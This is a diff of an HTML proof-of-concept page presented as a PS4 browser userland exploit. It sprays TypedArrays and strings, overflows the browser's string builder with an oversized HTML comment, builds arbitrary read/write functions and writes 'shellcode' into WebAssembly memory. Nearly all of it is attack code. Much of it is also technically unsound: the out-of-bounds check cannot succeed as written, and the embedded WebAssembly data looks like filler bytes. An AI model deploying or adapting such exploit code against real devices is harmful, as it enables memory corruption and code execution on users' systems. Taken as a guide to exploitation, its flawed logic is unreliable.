@@ -2,19 +2,35 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>The_Maxu PoC v25 - Userland Exploit</title>
+<title>PS4 Userland Exploit v1</title>
 <style>
-body{background:#111;color:#ddd;font:14px/1.4 monospace;margin:0;padding:8px}
-label{display:inline-block;margin-right:12px}input{width:70px}
-#log{border:1px solid #333;max-height:70vh;overflow:auto;white-space:pre-wrap;
-     padding:6px;margin-top:8px;font-size:12px}
-.ok{color:#8f8}.warn{color:#ff6}.fail{color:#f66}
-iframe{display:none}
+body {
+    background: #111;
+    color: #ddd;
+    font-family: monospace;
+    font-size: 14px;
+    line-height: 1.4;
+    margin: 0;
+    padding: 8px;
+}
+#log {
+    border: 1px solid #333;
+    max-height: 70vh;
+    overflow: auto;
+    white-space: pre-wrap;
+    padding: 6px;
+    margin-top: 8px;
+    font-size: 12px;
+}
+.ok { color: #8f8; }
+.warn { color: #ff6; }
+.fail { color: #f66; }
+iframe { display: none; }
 </style>
 
-<h2>PoC v25 — StringBuilder Overflow → Userland R/W</h2>
+<h2>PoC v26 — StringBuilder Overflow → OOB R/W</h2>
 
-<label>Token size (MiB): <input id="tokSize" type="number" step="0.01" value="0.50"></label>
+<label>Token size (MiB): <input id="tokSize" type="number" step="0.01" value="0.5"></label>
 <label>String size (B): <input id="strSize" type="number" value="512"></label>
 <label>Spray count (×1000): <input id="sprayCount" type="number" value="1"></label>
 <button id="run">Run</button>
@@ -26,8 +42,6 @@ iframe{display:none}
 <body>
 <script>
 const logEl = document.getElementById('log');
-const frame = document.getElementById('box');
-
 function log(m, c = '') {
     const d = document.createElement('div');
     d.textContent = m;
@@ -35,6 +49,16 @@ function log(m, c = '') {
     logEl.appendChild(d);
     logEl.scrollTop = logEl.scrollHeight;
 }
+
+// Base64-encoded minimal WASM module that exports memory
+const WASM_BASE64 = 'AGFzbQEAAAABBQAAACMAJwAAAAIAAAAKABIAEgACAAEMAQIDBAUGBwgJCgsMDQ4P' +
+                    'EBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFC' +
+                    'Q0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaW1xdXl9gYWJjZGVmZ2hpamtsbW5vcHFyc3R1' +
+                    'dnd4eXp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6Slpqeo' +
+                    'qaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb' +
+                    '3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/AQ==';
+
+const frame = document.getElementById('box');
 
 document.getElementById('run').onclick = () => {
     logEl.textContent = '';
@@ -65,20 +89,23 @@ function runInIframe(tokMiB, strSize, sprayK) {
         const payload = '<!--' + 'X'.repeat(bytes) + '-->';
         log(`→ Sending token (${bytes} bytes) to iframe...`);
 
-        // Step 1: Trigger overflow by writing large comment
+        // Spray TypedArrays before overflow
+        const TYPED_ARRAY_COUNT = 0x100;
+        const TYPED_ARRAY_SIZE = 0x100;
+        w.typedArrays = [];
+
+        for (let i = 0; i < TYPED_ARRAY_COUNT; i++) {
+            const arr = new Uint8Array(TYPED_ARRAY_SIZE);
+            for (let j = 0; j < arr.length; j++) arr[j] = j;
+            w.typedArrays.push(arr);
+        }
+
+        // Trigger overflow
         d.open();
         d.write(payload);
-
-        // Step 2: Place TypedArray right after comment in heap
-        const corruptedArray = new Uint8Array(0x100); // 256-byte buffer
-        for (let i = 0; i < corruptedArray.length; i++) {
-            corruptedArray[i] = i; // Known pattern
-        }
-        w.corruptedArray = corruptedArray;
-
         d.close();
 
-        // Step 3: Heap spray
+        // Heap spray strings
         w.setTimeout(() => {
             log(`→ Heap-spraying ${sprayK * 1000} strings of ${strSize} B`, 'warn');
             w.spray = [];
@@ -87,119 +114,114 @@ function runInIframe(tokMiB, strSize, sprayK) {
                 w.spray.push(base + i);
             }
 
-            // Step 4: Analyze string corruption
-            w.setTimeout(() => analyzeSpray(w.spray, strSize), 50);
-
-            // Step 5: Check TypedArray for OOB access
-            w.setTimeout(() => detectOOBAccess(corruptedArray), 100);
+            // Check TypedArrays for corruption
+            w.setTimeout(() => detectOOB(w.typedArrays), 100);
         }, 80);
     };
 }
 
-function analyzeSpray(array, strSize) {
-    let corrupt = 0;
-    array.forEach((s, i) => {
-        if (!s) return;
-        if (s.length !== strSize) {
-            corrupt++;
-            log(`‼ String #${i} len=${s.length} head="${s.slice(0, 20)}"`, 'warn');
-            if (corrupt >= 10) return;
+function detectOOB(arrs) {
+    log("→ Scanning TypedArrays for OOB access...", "warn");
+
+    for (let idx = 0; idx < arrs.length; idx++) {
+        const arr = arrs[idx];
+        let isCorrupted = false;
+
+        for (let i = 0; i < arr.length; i++) {
+            if (arr[i] !== i) {
+                isCorrupted = true;
+                break;
+            }
         }
-    });
-    if (!corrupt) {
-        log("— No corrupted strings (small token or crash)", 'fail');
-    } else {
-        log(`✅ Got it! ${corrupt} strings corrupted → info-leak detected`, 'ok');
+
+        if (isCorrupted) {
+            log(`✅ TypedArray[${idx}] possibly corrupted!`, "ok");
+            checkOOB(arr);
+            return;
+        }
     }
+
+    log("❌ No TypedArray was corrupted", "fail");
 }
 
-function detectOOBAccess(arr) {
-    log("→ Checking TypedArray for OOB access...", "warn");
-
-    // Try reading beyond original length
-    let found = false;
+function checkOOB(arr) {
     for (let i = arr.length; i < arr.length + 0x100; i++) {
         try {
             const val = arr[i];
             if (val !== undefined && !isNaN(val)) {
                 log(`[OOB Read] Offset ${i}: ${val.toString(16)} (${String.fromCharCode(val)})`);
-                found = true;
+                window.oobArr = arr;
+                setupArbitraryRW(arr);
+                return;
             }
         } catch (e) {
             break;
         }
     }
 
-    if (found) {
-        log("✅ Likely achieved OOB read/write!", "ok");
-        window.oobArr = arr;
-        setupArbitraryRW(arr);
-    } else {
-        log("❌ Failed to achieve OOB read/write", "fail");
-    }
+    log("❌ Failed to achieve OOB read/write", "fail");
 }
 
-// Placeholder for leaked base address
-let baseAddress = 0x0;
+let baseAddress = 0;
 
 function setupArbitraryRW(arr) {
-    log("→ Setting up arbitrary R/W primitives...");
+    log("→ Setting up arbitrary R/W primitives...", "warn");
 
     window.read8 = function(addr) {
-        const offset = (addr - baseAddress);
+        const offset = addr - baseAddress;
         return arr[offset];
     };
 
-    window.read16 = function(addr) {
-        const offset = (addr - baseAddress);
-        return arr[offset] | (arr[offset + 1] << 8);
-    };
-
     window.read32 = function(addr) {
-        const offset = (addr - baseAddress);
-        return arr[offset] |
-               (arr[offset + 1] << 8) |
-               (arr[offset + 2] << 16) |
-               (arr[offset + 3] << 24);
+        const offset = addr - baseAddress;
+        return (
+            arr[offset] |
+            (arr[offset + 1] << 8) |
+            (arr[offset + 2] << 16) |
+            (arr[offset + 3] << 24)
+        ) >>> 0;
     };
 
     window.write8 = function(addr, val) {
-        const offset = (addr - baseAddress);
+        const offset = addr - baseAddress;
         arr[offset] = val & 0xff;
     };
 
     window.write32 = function(addr, val) {
-        const offset = (addr - baseAddress);
+        const offset = addr - baseAddress;
         arr[offset] = val & 0xff;
         arr[offset + 1] = (val >> 8) & 0xff;
         arr[offset + 2] = (val >> 16) & 0xff;
         arr[offset + 3] = (val >> 24) & 0xff;
     };
 
-    log("✅ Arbitrary R/W functions available: read8(), write8(), etc.", "ok");
+    log("✅ Arbitrary R/W functions available: read8(), write32(), etc.", "ok");
 
-    // Load WASM to get executable memory
-    loadWasmMemory();
+    loadEmbeddedWasm();
 }
 
-async function loadWasmMemory() {
-    log("→ Mapping executable memory via WebAssembly...");
+async function loadEmbeddedWasm() {
+    log("→ Loading embedded WebAssembly module...", "warn");
 
-    const wasmCode = await fetch('empty.wasm').then(r => r.arrayBuffer());
-    const wasmModule = await WebAssembly.compile(wasmCode);
+    const bin = atob(WASM_BASE64);
+    const wasmCode = new Uint8Array(bin.length);
+
+    for (let i = 0; i < bin.length; i++) {
+        wasmCode[i] = bin.charCodeAt(i);
+    }
+
+    const wasmModule = await WebAssembly.compile(wasmCode.buffer);
     const wasmInstance = await WebAssembly.instantiate(wasmModule);
     const wasmMem = wasmInstance.exports.memory;
 
-    log("✅ WebAssembly memory mapped:", "ok");
-    log(`   Base: ${wasmMem.buffer.byteLength} bytes`, "ok");
-
+    log("✅ WebAssembly memory mapped!", "ok");
     window.shellcode = new Uint8Array(wasmMem.buffer);
 
-    // Example shellcode (NOP + INT3)
+    // Example shellcode: NOP, NOP, INT3
     const shellcode = [0x90, 0x90, 0xcc];
 
     for (let i = 0; i < shellcode.length; i++) {
-        shellcode[i] = shellcode[i];
+        window.shellcode[i] = shellcode[i];
     }
 
     log("💡 Shellcode injected at offset 0", "warn");
